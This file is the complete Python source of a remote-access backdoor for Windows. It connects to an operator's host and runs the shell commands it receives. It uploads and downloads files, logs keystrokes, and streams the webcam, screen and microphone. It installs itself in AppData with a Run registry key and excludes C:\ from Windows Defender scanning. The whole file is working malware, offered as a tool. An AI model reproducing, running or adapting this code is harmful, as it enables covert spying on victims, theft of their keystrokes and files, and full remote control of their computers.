import socket
import json
import os
import subprocess
import base64
import platform
import time
import threading
import sys
import shutil


class Backdoor:
    def __init__(self, ip_add, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip_add = ip_add
        self.port = port
        self.sock = sock
        sock.connect((ip_add, port))
        self.kl_start = False


    def pre(self):
        subprocess.call("python -m pip install --upgrade pip", shell=True)
        subprocess.call("pip install pynput==1.6.8", shell=True)
        subprocess.call("pip install .\\PyAudio-0.2.11-cp310-cp310-win_amd64.whl", shell=True)
        subprocess.call("pip install vidstream", shell=True)
        subprocess.call("pip install pillow", shell=True)
        subprocess.call("pip install pyautogui", shell=True)
        subprocess.call("pip install cryptography", shell=True)
        subprocess.call("pip install opencv-python", shell=True)        


    def check_cmd(self, cmd, wanted_cmd, ln):
        if cmd[0].lower() == wanted_cmd and len(cmd) == ln:
            return 1
        return 0

    def reliable_send(self, data):
        json_data = json.dumps(data)
        return self.sock.send(json_data.encode())

    def reliable_recv(self):
        json_data = ""
        while 1:
            try:
                json_data += self.sock.recv(1024).decode().rstrip()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commands(self, cmd):
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()

    def change_dir(self, directory):
        try:
            os.chdir(directory)
            return f"[+] Changing To {directory}"
        except FileNotFoundError:
            return "Invalid Directory !"

    def read_file(self, path):
        try:
            d_file = open(path, "rb")
            return base64.b64encode(d_file.read())
        except FileNotFoundError:
            return b"File Not Found !"

    def write_file(self, file_name, content, path="./"):
        try:
            d_file = open(path + file_name, "wb")
            d_file.write(base64.b64decode(content))
            d_file.close()
            return "Upload Done."
        except FileNotFoundError:
            return "Invalid Directory !"

    def screenshot(self):
        import pyautogui
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("ss.png")


    def win_deff(self):
        os.system("powershell -Command Add-MpPreference -ExclusionPath 'C:\\'")
        os.system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v Wx86 /f")
        os.system("reg add  \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v Wx86 /t REG_DWORD /d 1 /f")


    def persistence(self):
        try:
            #subprocess.call(f"copy .\\test_client.py {appdata_path}", shell=True)
            if platform.system() == "Windows":
                appdata_path = os.environ["appdata"] + "\\win32.pyw"
            else :
                appdata_path = "/var/sys32.pyw"
            shutil.copy(__file__, appdata_path)
            subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v System32 /f")
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v System32 /t REG_SZ /d "{appdata_path}"',shell=True)
            return "[+] Persistence is ON."
        except Exception:
            return "[-] Upload Your Persistence... Because there is an Error Occur!"

    def save_strokes(self, key):
        with open("strokes.txt", "a") as ks_file:
            ks_file.write(str(key)+"\n")

    def key_log_start(self): # add encryption for keys
        self.kl_start = True
        from pynput.keyboard import Listener
        with Listener(on_press=self.save_strokes) as keyboard_listener:
            self.keyboard_listener = keyboard_listener
            keyboard_listener.join()

    def key_log_dump(self):
        if self.kl_start == False:
            return "[+] Start The Keylogger First."
        return open("strokes.txt", "r").read()


    def key_log_stop(self):
        self.keyboard_listener.stop()
        path = os.environ["appdata"] + "\\strokes.txt"
        os.remove(path)
        self.kl_start = False

    def vid_stream(self):
        from vidstream import CameraClient
        import threading
        self.vid_send = CameraClient(self.ip_add, 8888)
        t1 = threading.Thread(target=self.vid_send.start_stream)
        t1.start()
    
    def piCapture(self):
        import cv2
        import os
        imageCapObj = cv2.VideoCapture(0)
        ret, frame = imageCapObj.read()
        pic_path = os.environ['appdata'] + "\\Pic.jpg"
        cv2.imwrite(pic_path, frame)
        imageCapObj.release()
        cv2.destroyAllWindows()
        bin_cap = self.read_file(pic_path).decode()
        os.remove(pic_path)
        return bin_cap
        
    def screenSharing(self):
        from vidstream import ScreenShareClient
        import threading
        self.ss_send = ScreenShareClient(self.ip_add, 7890)
        t1 = threading.Thread(target=self.ss_send.start_stream)
        t1.start()
    
    def voice_send(self):
        from vidstream import AudioSender
        import threading
        self.voi_sender = AudioSender(self.ip_add, 3429)
        t1 = threading.Thread(target=self.voi_sender.start_stream)
        t1.start()


    def run(self):
        while 1:
            self.persistence()
            self.win_deff() # works only for admin priv
            try:
                recv_cmd = self.reliable_recv()
                if recv_cmd[0] == "quit" :
                    if  self.kl_start == True :
                        self.key_log_stop()
                    self.sock.close()
                    break
                elif self.check_cmd(recv_cmd, "Persistence", 1):
                    data = self.persistence()
                elif self.check_cmd(recv_cmd, "sysinfo", 1):
                    data = f"OS : {platform.system()}\nVersion : {platform.release()}"
                elif recv_cmd[0].lower() == "cd" and len(recv_cmd) > 1:
                    if len(recv_cmd) > 2:
                        data = self.change_dir(" ".join(recv_cmd[1:]))
                    else:
                        data = self.change_dir(recv_cmd[1])
                elif self.check_cmd(recv_cmd, "download", 2):
                    data = self.read_file(recv_cmd[1]).decode()
                elif self.check_cmd(recv_cmd, "upload", 3): 
                    data = self.write_file(recv_cmd[1], recv_cmd[2])
                elif self.check_cmd(recv_cmd, "screenshot", 1):
                    self.screenshot()
                    screenShot = self.read_file("ss.png")
                    data = ["ss", screenShot.decode()]
                    os.remove("ss.png")
                elif self.check_cmd(recv_cmd, "start_kl", 1):
                    kl_thread = threading.Thread(target=self.key_log_start)
                    kl_thread.start()
                    data = "[+] Keylogger Started."
                elif self.check_cmd(recv_cmd, "dump_ks", 1):
                    data = self.key_log_dump()
                elif self.check_cmd(recv_cmd, "kl_stop", 1):
                    self.key_log_stop()
                    data = "[+] Keylogger Stopped."
                elif self.check_cmd(recv_cmd, "open_cam", 1):
                    self.vid_stream()
                    data = "[+] Target Camera has been Opened."
                elif self.check_cmd(recv_cmd, "close_cam", 1):
                    self.vid_send.stop_stream()
                    data = "[+] Target Camera has been Closed."
                elif self.check_cmd(recv_cmd, "screenshare", 1):
                    self.screenSharing()
                    data = "[+] ScreenSharing has Started."
                elif self.check_cmd(recv_cmd, "screenshare_off", 1):
                    self.ss_send.stop_stream()
                    data = "[+] ScreenSharing has Terminated."
                elif self.check_cmd(recv_cmd, "picap", 1):
                    data = self.piCapture()
                elif self.check_cmd(recv_cmd, "help", 1):
                    data = "\n"
                elif self.check_cmd(recv_cmd, "voice_cap", 1):
                    self.voice_send()
                    data = "[+] Voice Capturing has Started."
                elif self.check_cmd(recv_cmd, "voice_cap_off", 1):
                    self.voi_sender.stop_stream()
                    data = "[+] Voice Capturing has Terminated."
                elif self.check_cmd(recv_cmd, "show_targets", 1):
                    self.sock.close()
                    break
                else:
                    data = self.execute_commands(recv_cmd)
                self.reliable_send(data)
            except Exception:
                self.reliable_send("[!] Invalid Command")
                continue

